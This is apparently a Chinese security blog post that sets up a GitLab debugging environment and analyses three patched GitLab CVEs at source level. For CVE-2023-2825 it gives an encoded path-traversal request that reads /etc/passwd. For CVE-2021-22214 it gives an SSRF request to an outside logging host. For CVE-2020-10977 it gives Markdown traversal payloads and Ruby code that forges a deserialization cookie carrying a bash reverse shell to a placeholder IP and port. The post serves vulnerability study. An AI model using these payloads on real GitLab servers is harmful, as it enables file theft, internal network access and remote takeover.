---
title: "GitLab部分漏洞分析"
date: 2023-07-22T11:47:22+08:00
categories:
  - Web
---

# GDK运行+调试环境搭建

GDK全称GitLab Development Kit，是GitLab官方为了方便开发者为GitLab开源项目贡献开源代码而开发的一键式GitLab运行+调试部署工具，在需要对GitLab漏洞进行调试和分析的情况下，除去使用GitLab的[Docker镜像](https://hub.docker.com/r/gitlab/gitlab-ee)也可以利用GDK来搭建环境，地址为<https://gitlab.com/gitlab-org/gitlab-development-kit>。

如果需要分析的是GitLab最新的代码，则使用GDK官方文档里的安装步骤就可以一步到位。但如果利用GDK进行漏洞复现与分析，往往需要使用到老版本的GitLab代码，此时如果使用最新的GDK部署的话，则会不可避免的出现很多依赖相关的问题（如Ruby版本要求不一致，一些Ruby依赖包不符合版本要求等），在整个部署的时候会遇到很多坑。下面大概说一下一个较为可行的部署流程，以及我在部署过程中的一些问题。

此处以v15.1.0-ee版本的部署为例。首先Clone一下GDK：

```bash
git clone https://gitlab.com/gitlab-org/gitlab-development-kit.git gdk
```

## GDK版本调整和初始化

接下来需要查看GitLab版本的发布时间，将GDK也Checkout到对应版本发布日期附近的提交处，这样可以保证GDK使用的Ruby版本和GitLab一致，避免后续安装过程中因为Ruby大版本不一致导致的各种依赖问题。

查看提交记录可以发现v15.1.0-ee的发布时间为2022年6月21日，所以我将GDK调整至2022年7月26日的提交处：[77019f1204a3bbcb44bac37bfd0da4059aa130e9](https://gitlab.com/gitlab-org/gitlab-development-kit/-/commit/77019f1204a3bbcb44bac37bfd0da4059aa130e9)。只要保证GDK的Ruby依赖版本不要和GitLab的相差过大即可。

![](https://pic.hujiekang.top/uploads/big/90c0884ffc825ca75d1152fce1ce0817.png)

切换版本之后，与官方文档中手动部署的步骤一致，使用`make bootstrap`初始化GDK，安装GDK相关的依赖。在[这篇文章中](https://starlabs.sg/blog/2022/07-gitlab-project-import-rce-analysis-cve-2022-2185/)提到了使用一键脚本部署后再Checkout GitLab到对应版本的方式，经过测试我发现如果版本相差过大，依赖问题依然会存在，并且可能存在数据库结构不一样的问题，因此此处更好的解决方案是手动Clone GitLab仓库，自行Checkout之后再开始部署GDK，如下。

```bash
git clone https://gitlab.com/gitlab-org/gitlab.git gdk/gitlab
cd gdk/gitlab
git checkout v15.1.0-ee
cd ..
gdk install
```

在`gdk install`的过程中可能会出现各种各样奇奇怪怪的问题，我主要把问题归结于以下两类：

- 由于GDK调整了到早期版本，有些Bug还没修，通过Google和GDK的Issues大部分可以找到解决方案；
- 一些Native Extension的编译问题，如OpenSSL、gpgme等等；（gpgme问题出现的频率最高，主要表现为gpgme编译失败，解决方案是不通过bundler安装gpgme而是使用`gem install gpgme -- --use-system-libraries`手动安装）
- Ruby版本不同导致的依赖问题，如有些软件包的老版本不再被新版Ruby支持，又或是一些新版本的软件包不被老版本的Ruby支持。（这里因为前面已经通过Checkout把GDK和GitLab的依赖版本调整到尽可能一致了，所以这里不会有太大的问题）

## 一些配置的修改

`gdk install`成功跑完之后，就相当于脚本安装结束了。接下来修改`gitlab/config/gitlab.yml`配置文件，修改监听的IP地址，以及关闭Webpack的开发模式，可以减少一点占用：

```yaml {hl_lines=[2,3,8]}
gitlab:
  host: 0.0.0.0
  port: 3000
  https: false

webpack:
  dev_server:
    enabled: false
```

修改完了配置文件，需要重新编译一下前端资源：

```bash
rake gitlab:assets:compile
```

然后使用`gdk start`启动GitLab，可以使用`gdk tail`看看启动的Log，有报错信息再对症下药去修，直到没有报错，应该就能够正常访问了，整个环境也就搭建完毕。

## 使用RubyMine调试代码

接下来在RubyMine IDE中添加运行/调试配置，来实现在RubyMine中直接动态调试GitLab代码。首先启动GitLab的其余服务，留下rails-web和sidekiq不启动：

```bash
gdk stop
gdk start webpack rails-background-jobs sshd praefect praefect-gitaly-0 redis postgresql
```

然后在RubyMine中添加如下运行配置：（需要提前在设置中选好Ruby SDK的版本）

![](https://pic.hujiekang.top/uploads/big/81ea988e180fc696ee3b305b2ed9874c.png)

设置完毕，就可以下断点直接调试了。（RubyMine可以直接在Controller方法前面显示路由的URI，所以查找对应的接口也比较方便）

![](https://pic.hujiekang.top/uploads/big/95a240bafe214d3b9579a3fb5115d716.png)

# GitLab架构概述

GitLab的架构描述在官网也有介绍：[GitLab architecture overview | GitLab](https://docs.gitlab.com/ee/development/architecture.html)，下面是包含了GitLab主要组件的架构图。

![](https://pic.hujiekang.top/uploads/medium/b1dbd42efa252e5d355d8650754cd157.png)

- Nginx：HTTP/HTTPS流量的总入口，作用是将不同类型的请求转发到其他的子系统中；
- GitLab Pages：静态网页服务，类似Github Pages；
- GitLab Workhorse：GitLab的二层反向代理，在老版本的GitLab中采用的是Unicorn，但是因为Unicorn在HTTP/HTTPS Git Clone的时候会出现超时时间过短的问题导致无法Clone，所以开发团队以此为契机用Golang写了一个反向代理替换了Unicorn，并在逐渐开发完善之后更名为GitLab Workhorse。现在的Workhorse被用来分摊GitLab Rails后端的压力，如大文件的上传与下载；
- GitLab Shell：用于处理SSH会话，以及修改`authorized_keys`；
- Gitaly：GitLab的Git RPC服务，整个GitLab中几乎所有Git相关的操作都是通过Gitaly完成的；
- Puma (GitLab Rails)：基于Ruby on Rails开发的GitLab主程序后端，包含了GitLab的核心网站处理逻辑；
- Sidekiq (GitLab Rails)：与Ruby on Rails集成的Ruby后台处理服务，用于多线程高效处理一些异步任务。在GitLab中，Sidekiq将从Redis中读取后台任务队列，并按要求调度执行；
- PostgreSQL：GitLab的主数据库，存储用户、项目等数据信息；
- Redis：键值对数据库，是GitLab核心组件的一部分，用于存储用户的会话数据、临时缓存以及提供给Sidekiq的后台任务队列。

图中描述的组件只是GitLab的一部分，还有诸如GitLab Runner、MinIO、Praefect等等一些附加模块，在官网上有个巨大的流程图中都有描述。

# Gitlab版本探测的方法

1. 在已登录的情况下访问`http://GITLAB_HOST/help`页面，可获得当前运行的Gitlab版本号；
2. 在拥有管理员权限的情况下，还可访问`http://GITLAB_HOST/admin`页面，可获得当前运行的Gitlab版本号和基本信息；
3. 在拥有机器Shell的情况下，可以直接查看Gitlab目录下的VERSION文件来获得对应的版本号，以Docker中的Gitlab为例，路径为`/opt/gitlab/embedded/service/gitlab-rails/VERSION`；
4. 渗透的时候还可以借助Gitlab前端资源文件的哈希来判别其版本，参考https://github.com/jas502n/GitlabVer，但对小版本号的判断较为模糊。

# GitLab漏洞复现

## CVE-2023-2825 - 目录遍历

### 原理

由上面的架构图可见，发往GitLab的每个请求都需要经过两层中间件的转发，才将请求转发到GitLab Rails服务器上，分别是Nginx和Gitlab Workhorse。

在Nginx中已经提供了对目录穿越的保护措施，Nginx会防止攻击者使用诸如`../`这样的字符串来穿越到超过根域名层次的位置。对于正常的不经编码的`../`目录穿越字符串，Nginx会在匹配到之后直接对URI向上层回溯（如`/foo/bar/../`将直接跳转到`/foo`，参考 [Nginx 源码](https://github.com/nginx/nginx/blob/master/src/http/ngx_http_parse.c#L1466)），若回溯之后的指针位置超出了URI的字符串范围，说明目录穿越超过了根域名的目录层级，是非法的，直接返回400。而对于经过了URL编码后的目录穿越字符串，在[源码中](https://github.com/nginx/nginx/blob/master/src/http/ngx_http_parse.c#L1499) Nginx会直接进行URL解码，随后再进行上述的匹配。

当Nginx检测到URI中的目录穿越字符串并没有超过根域名范围，是符合要求的时候，Nginx会直接把对应的原始URI向后转发给GitLab Workhorse，如GitLab Nginx配置文件所写：

```nginx {hl_lines=[21]}
# lib/support/nginx/gitlab
location / {
  client_max_body_size 0;
  gzip off;

  ## https://github.com/gitlabhq/gitlabhq/issues/694
  ## Some requests take more than 30 seconds.
  proxy_read_timeout      300;
  proxy_connect_timeout   300;
  proxy_redirect          off;

  proxy_http_version 1.1;

  proxy_set_header    Host                $http_host;
  proxy_set_header    X-Real-IP           $remote_addr;
  proxy_set_header    X-Forwarded-For     $proxy_add_x_forwarded_for;
  proxy_set_header    X-Forwarded-Proto   $scheme;
  proxy_set_header    Upgrade             $http_upgrade;
  proxy_set_header    Connection          $connection_upgrade_gitlab;

  proxy_pass http://gitlab-workhorse;
}
```

如前面的架构描述中提到的，GitLab Workhouse主要用于处理一些大型HTTP请求，所以此处Workhouse也直接把请求向后转发给Puma，没有做额外的处理。基于Ruby on Rails的Puma，其所有路由规则都定义在`config/routes.rb`以及`config/routes`文件夹下。查看`config/routes/uploads.rb`，可以获取到其针对上传文件的URI匹配规则：

```ruby
scope path: :uploads do
  # Note attachments and User/Group/Project/Topic avatars
  get "-/system/:model/:mounted_as/:id/:filename",
    to: "uploads#show",
    constraints: { model: %r{note|user|group|project|projects\/topic|achievements\/achievement}, mounted_as: /avatar|attachment/, filename: %r{[^/]+} }

  ......
end
```

可以看见此处对文件名的匹配规则`:filename`是直接用正则表达式匹配过来的，直接将未经URL解码的文件名传给了`uploads#show`方法，导致带有路径穿越的文件名进入了GitLab Rails的后端逻辑。

通过动态调试，位于`ActionDispatch::Journey::Router`的`serve`方法，用于对HTTP请求进行路由匹配。注意到在`find_routes(req).each`的循环块里面参数就已经被解码了，所以解码逻辑一定在`find_routes`方法里面。

```ruby
# ActionDispatch::Journey::Router#serve
def serve(req)
  find_routes(req).each do |match, parameters, route|
    set_params  = req.path_parameters
    path_info   = req.path_info
    script_name = req.script_name
    ......
```

`find_routes`方法用于对请求的URI寻找对应的路由规则，并在之后交由对应控制器进行处理。从代码可以看见，Rails是在路由匹配成功过后，再逐个匹配参数值，使用`Utils.unescape_uri`方法对参数进行URL解码。

```ruby {hl_lines=[24,25]}
# ActionDispatch::Journey::Router#find_routes
def find_routes(req)
  path_info = req.path_info
  # 匹配并寻找符合规则的所有路由
  routes = filter_routes(path_info).concat custom_routes.find_all { |r|
    r.path.match?(path_info)
  }

  # 对找到的路由规则筛选并排序
  if req.head?
    routes = match_head_routes(routes, req)
  else
    routes.select! { |r| r.matches?(req) }
  end

  routes.sort_by!(&:precedence)

  # 对符合条件的路由规则逐一匹配参数，形成参数字典以及匹配的数据返回
  routes.map! { |r|
    match_data = r.path.match(path_info)
    path_parameters = {}
    match_data.names.each_with_index { |name, i|
      val = match_data[i + 1]
      # 此处对匹配到的参数进行了解码
      path_parameters[name.to_sym] = Utils.unescape_uri(val) if val
    }
    [match_data, path_parameters, r]
  }
end
```

![](https://pic.hujiekang.top/uploads/medium/55e921c62837ef56f1c6d902bb2f4433.png)

完成了路由匹配之后，经过了解码的带有目录穿越的文件名字符串就顺利地进入到了`uploads#show`方法，对应`UploadsController`，`show`方法的实现在其父类`UploadsActions`中，`send_upload`方法将读取对应的文件并发送。

```ruby {hl_lines=[21]}
# app/controllers/concerns/uploads_actions.rb
def show
  return render_404 unless uploader&.exists?

  ttl, directives = *cache_settings
  ttl ||= 0
  directives ||= { private: true, must_revalidate: true }

  expires_in ttl, directives

  file_uploader = [uploader, *uploader.versions.values].find do |version|
    version.filename == params[:filename]
  end

  return render_404 unless file_uploader

  workhorse_set_content_type!
  send_upload(file_uploader, attachment: file_uploader.filename, disposition: content_disposition)
end
```

### 复现

在 “Groups” 一栏中创建一个新的小组，创建完成后再在该小组内创建一个子小组，重复多次即可创建一个嵌套的小组结构，如下图。

![](https://pic.hujiekang.top/uploads/medium/d814f14c53d3d8a62be94dd9673634af.png)

为了访问到Gitlab的项目目录，至少需要穿越5-6层目录，而为了访问到根目录则需要穿越更多层，对应创建的小组层数取决于具体部署Gitlab的位置。在Docker环境中，上传的文件位于如下位置，故此处为了访问到根目录，需要穿越10层目录：

```shell
/var/opt/gitlab/gitlab-rails/uploads/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b/d568b1320c1fe87da0a05d476de39e00/file.txt
```

在最里面一级的子小组里面使用Issue或Snippets功能上传一个附件，获取到其URL之后将其后面的文件名修改成恶意的目录穿越Payload，即可利用成功。

```plaintext
GET /l1/l2/l3/l4/l5/l6/l7/l8/l9/l10/l11/root/uploads/b4d0c4dbb97a27ee013a55fc82e3c8be/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
```

![](https://pic.hujiekang.top/uploads/medium/deae1a1b3e525c5c00db8cb0c35817eb.png)

## CVE-2021-22214 - 未授权SSRF

### 原理

Gitlab提供了CI Lint API来验证CI/CD配置文件的语法有效性，官方文档中提供了对该API的详细用法描述：https://docs.gitlab.com/ee/api/lint.html。在最新的Gitlab文档中，此API仅对指定的namespace或者project开放，触发此漏洞的作用于全局的CI Lint API `/api/v4/ci/lint`在新版本中已被废弃，如下图所示。

![](https://pic.hujiekang.top/uploads/medium/248ac66971706cf42e4a73141ddbb1df.png)

如文档中所示，在选项`include_merged_yaml`开启时，API将会通过`content`中的YAML配置对获取提供的远程YAML文件，并在API的响应中输出合并后的YAML配置信息。通过下面的配置来指定包含一个远程的YAML文件：

```yaml
include:
  remote: 'https://example.com/remote.yaml'
```

在受该漏洞影响的Gitlab版本中，对该API接口的认证措施不够严格，因此攻击者可以利用这个远程获取文件的特性，实施未授权的SSRF，以Gitlab服务器的身份发送请求。这一点可以通过对应的补丁提交记录看出来，如下图所示。

![](https://pic.hujiekang.top/uploads/medium/6b2e6d14786a51db82d4b2090931c73a.png)

在未修复的代码中，接口在鉴权时只判断了“完全禁止注册新用户”的情况，并未考虑到还有一种“限制注册新用户”的情况，所以在修复后的代码中，新增了一个方法`signup_limited`用于判断限制注册的情况，包括下面几种：

- 域名白名单存在；
- 限制指定Email注册；
- 注册后需要经过管理员验证。

在禁止注册或者限制注册的情况下，如果当前用户没有有效的身份，说明鉴权失败；而在其他开放注册的情况，说明任意用户都能获得一个有效的用户身份，从而合法使用这项功能。所以在实际部署时，为了避免相关功能被滥用，应该依照具体情况尽可能的限制注册。

### 复现

对接口`/api/v4/ci/lint`发送POST请求，请求体为JSON，设置`include_merged_yaml`项为`true`，并在`content`项里包含带有请求URL的YAML内容，如下面的HTTP请求所示。

```http {hl_lines=[11]}
POST /api/v4/ci/lint HTTP/1.1
Host: 127.0.0.1:1600
User-Agent: curl/8.1.2
Accept: */*
Content-Type: application/json
Content-Length: 120
Connection: close

{
	"include_merged_yaml": true,
	"content": "include:\n  remote: http://gvgav89c.requestrepo.com/cve-2021-22214#test.yml"
}
```

发送该请求，Gitlab将会请求对应的URL。此处URL限制了只能以`.yml`与`.yaml`的后缀结尾，为了绕过这个限制可以使用`?`和`#`字符，Ruby在处理URL时会把参数和Hash都忽略，如上面的请求所示。使用DNSLog等工具可以判断攻击是否成功，请求发送之后，对应平台上可以收到请求信息，如下图所示。

![](https://pic.hujiekang.top/uploads/medium/3ee1e2a5d5820d683c46a3b5c9d5a89f.png)

对于限制的URL协议，在Gitlab的`UrlSanitizer`类中有声明，仅限HTTP、HTTPS、SSH和GIT协议，但实际上只有HTTP、HTTPS可用，使用另外两个协议会报`could not be fetched because of HTTP error`错误。

```ruby {hl_lines=[5,6]}
module Gitlab
  class UrlSanitizer
    include Gitlab::Utils::StrongMemoize

    ALLOWED_SCHEMES = %w[http https ssh git].freeze
    ALLOWED_WEB_SCHEMES = %w[http https].freeze
```

对应的调用链如下：

```ruby
lib/api/lint.rb #post '/lint'
lib/gitlab/ci/yaml_processor.rb #Gitlab::Ci::YamlProcessor.new
lib/gitlab/ci/yaml_processor.rb #Gitlab::Ci::YamlProcessor.execute
lib/gitlab/ci/yaml_processor.rb #Gitlab::Ci::YamlProcessor.parse_config
lib/gitlab/ci/config.rb #Gitlab::Ci::Config.new
lib/gitlab/ci/config.rb #Gitlab::Ci::Config.expand_config
lib/gitlab/ci/config.rb #Gitlab::Ci::Config.build_config
lib/gitlab/ci/config/external/processor.rb #Config::External::Processor.new
lib/gitlab/ci/config/external/processor.rb #Config::External::Processor.perform
lib/gitlab/ci/config/external/mapper.rb #External::Mapper.new
lib/gitlab/ci/config/external/mapper.rb #External::Mapper.process
lib/gitlab/ci/config/external/mapper.rb #External::Mapper.process_without_instrumentation
lib/gitlab/ci/config/external/mapper/normalizer.rb #Normalizer.new
lib/gitlab/ci/config/external/mapper/normalizer.rb #Normalizer.process
lib/gitlab/ci/config/external/mapper/normalizer.rb #Normalizer.process_without_instrumentation
lib/gitlab/ci/config/external/mapper/normalizer.rb #Normalizer.normalize_location_string
lib/gitlab/url_sanitizer.rb #Gitlab::UrlSanitizer.valid
```

## CVE-2020-10977 - 目录遍历 & RCE

### 原理

#### 目录穿越

漏洞点发生在移动Issue时负责将Issue内的附件进行复制的`UploadsRewriter`类（lib/gitlab/gfm/uploads_rewriter.rb）的`rewrite`方法中。方法中匹配的`@pattern`即`FileUploader::MARKDOWN_PATTERN`，如下所示，匹配的即是Markdown中的超链接标记以及图片标记，对应用户在Issue中上传的文件。

```ruby
# This pattern is vulnerable to malicious inputs, so use Gitlab::UntrustedRegexp
# to place bounds on execution time
MARKDOWN_PATTERN = Gitlab::UntrustedRegexp.new(
    '!?\[.*?\]\(/uploads/(?P<secret>[0-9a-f]{32})/(?P<file>.*?)\)'
)
```

对于每个匹配到的文件信息，调用`find_file`方法去获取文件，其定义同样在`UploadsRewriter`中，调用的是`FileUploader.retrieve_from_store!` ，这个方法可以直接从本机存储中获取文件，而不会检查目录穿越问题。从修复漏洞的提交中（如下图）可以看出，正因为在检查Markdown中的文件时并未检查其文件名的目录穿越问题，导致第31行的`klass.copy_to`方法能够直接复制目录穿越后的文件，并以Markdown引用的形式附在新的Issue描述中。

![](https://pic.hujiekang.top/uploads/big/4a47f24dfe00b3c79cf52f3c36846e62.png)

#### Cookie序列化/反序列化

利用任意文件读取可以获取到Gitlab的`secret_key_base`值，这个值在Rails中用于生成很多密钥以及进行一些数据的签名。在[Rails 官方文档](https://api.rubyonrails.org/classes/Rails/Application.html#method-i-secret_key_base)中也提到了，Cookie相关的签名也是由这个值生成。因此获取了这个值之后，即可伪造Cookie的签名，注入恶意代码实施反序列化漏洞利用。[这篇文章](https://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token)对Rails的Cookie生成与解析方式进行了介绍。

> The `secret_key_base` is used as the input secret to the application’s key generator, which in turn is used to create all MessageVerifiers/MessageEncryptors, including the ones that sign and encrypt cookies.

尝试对生成序列化Cookie的代码进行分析：

```ruby {hl_lines=[7]}
# 此处指定了配置以及 Cookie 的序列化方法
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

# 利用 Ruby 的 ERB 模板库生成一个可以执行系统命令的 Ruby 模板对象
erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'` %>")

# 借助一个对象代理，来使得访问对象时能够自动调用响应的方法并返回值
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)

# 序列化对象并签名，输出 Cookie 的值
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

翻阅`ERB`和`ActiveSupport`的文档，发现`ERB`模板对象建立之后需要调用`erb.result`来获取模板渲染的结果，而Ruby在反序列化的过程中显然是不会自动调用这样一个普通的方法的，所以不做进一步处理的话，单单实例化`ERB`对象是无法实现命令执行的。此时类似Java的一些反序列化链，这里同样用到了一个对象代理对象`DeprecatedInstanceVariableProxy`。这个对象的用处就是把某个对象实例的某个方法标记为Deprecated（已废弃），抛出警告信息后再调用对应的方法并返回值。

`DeprecationProxy`的源码如下，在Ruby的反序列化过程中，需要调用`marshal_load/self._load`来还原对象实例（类似PHP的`__wakeup()` 和Java的`readObject()`）。而在`DeprecationProxy`中的一行关键代码（见下面代码中的标注），注销了当前类除了`object_id`和`__`开头的所有方法，这其中就包括了`marshal_load/self._load`。这样一来，在反序列化时，就会因为找不到`marshal_load/self._load`方法而进入`method_missing`方法中。`method_missing`方法中调用了`target`私有方法，在`DeprecatedInstanceVariableProxy`中即`@instance.__send__(@method)`，也就是以一种类似反射的方式调用到了我们指定的对象方法（`ERB.result`），实现了`ERB`的命令执行。

```ruby {hl_lines=[11,20,21,22,23]}
class Deprecation
    class DeprecationProxy # :nodoc:
        def self.new(*args, &block)
            object = args.first

            return object unless object
            super
        end

        # 这一行代码注销了当前类下面除了 `object_id` 和 `__` 开头的所有类方法
        instance_methods.each { |m| undef_method m unless /^__|^object_id$/.match?(m) }

        # Don't give a deprecation warning on inspect since test/unit and error
        # logs rely on it for diagnostics.
        def inspect
            target.inspect
        end

        private
        def method_missing(called, *args, &block)
            warn caller_locations, called, args
            target.__send__(called, *args, &block)
        end
    end

    class DeprecatedInstanceVariableProxy < DeprecationProxy
        def initialize(instance, method, var = "@#{method}", deprecator = nil)
            @instance = instance
            @method = method
            @var = var
            ActiveSupport.deprecator.warn("DeprecatedInstanceVariableProxy without a deprecator is deprecated") unless deprecator
            @deprecator = deprecator || ActiveSupport::Deprecation._instance
        end

        private
        def target
            @instance.__send__(@method)
        end

        def warn(callstack, called, args)
            @deprecator.warn("#{@var} is deprecated! Call #{@method}.#{called} instead of #{@var}.#{called}. Args: #{args.inspect}", callstack)
        end
    end
end
```

### 复现

在Gitlab中创建两个项目（此处创建了名为`test-a`和`test-b`的两个项目），如下图所示。

![](https://pic.hujiekang.top/uploads/big/cbce19faa03b4540ff3ed6d02e55ac8a.png)

在`test-a`仓库中新建一个Issue，在Description栏中填写带有目录穿越路径的Markdown图片引用，如下所示。（Gitlab的上传路径中包含一个长度为32的哈希串，此处同样需要遵循这个规则）

![](https://pic.hujiekang.top/uploads/big/f61925f663ef6587fb4a85ce9187d00c.png)

```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../etc/passwd)
```

Issue创建完毕后，使用Move Issue功能将这个Issue移动到`test-b`仓库中。如下图所示。

![](https://pic.hujiekang.top/uploads/medium/f3fae690e40b8185689612ed04a7524a.png)

移动成功后，原来带有目录穿越路径的图片变为一个可下载的附件，点击即可获取对应文件的内容（此处为 `/etc/passwd`），如下图所示。

![](https://pic.hujiekang.top/uploads/big/1ad1f57fd463f82fd59b607552b5dcc4.png)

在官方的Gitlab CE Docker镜像环境下，与CVE-2023-2825一致，需要穿越12层目录才能访问到根目录。在实际的部署环境中，目录穿越的层数取决于具体部署Gitlab的位置。当穿越的层数超过根目录的穿越层次时，依然能够顺利地从根目录开始读取文件，而当穿越的层数小于根目录的穿越层次时则无法读取对应的文件。

```markdown
# 有效
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../../../../../../../../../etc/passwd)
# 无效
![a](/uploads/11111111111111111111111111111111/../etc/passwd)
```

到此目录穿越就成功复现了。而对于12.4.0及以上版本受漏洞影响的GitLab来说，还可以进一步利用Cookie Serializer实现RCE。从12.4.0版本开始，GitLab提供了一个名为`experimentation_subject_id`的Cookie字段，Cookie Serializer会在接收到这个Cookie字段时直接反序列化对应的值。

要确保能够利用，首先需要确定 Gitlab 目录下`<path-to-gitlab-rails>/config/initializers/cookies_serializer.rb`中设置的`cookies_serializer`值为`:hybrid`或者`:marshal`。（在受漏洞影响的版本中，该值默认为`:hybrid`）

借助上面的任意文件读取，可以读取到`<path-to-gitlab-rails>/config/secrets.yml` 中的`secret_key_base`字段的值，如下图。

![](https://pic.hujiekang.top/uploads/big/228ff2fd1901caabcced285c0b30acef.png)

此时启动一个新的Gitlab实例，将对应位置的`secret_key_base`值替换掉。替换之后使用命令`gitlab-rails console`进入 Gitlab Rails 控制台，在其中执行如下代码（将`ERB.new`一行的命令替换为想要执行的命令即可）：

```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

需要注意的是，在执行这串代码的过程中，对应的系统命令也会在本机执行。最终会输出序列化后的Cookie值，使用该Cookie对Gitlab的任意接口进行请求即可执行对应的命令（上述命令对应的是反弹Shell，效果如下图）。

![](https://pic.hujiekang.top/uploads/big/e03a802dbe5a2e637e0b914f58583bcf.png)

另外，同样可以在不依赖另一个Gitlab环境的情况下生成Payload，参见 [MSF 的模块实现](https://github.com/rapid7/metasploit-framework/blob/54b4a503658209aa569512997f2c52bc347ed20b/modules/exploits/multi/http/gitlab_file_read_rce.rb)。
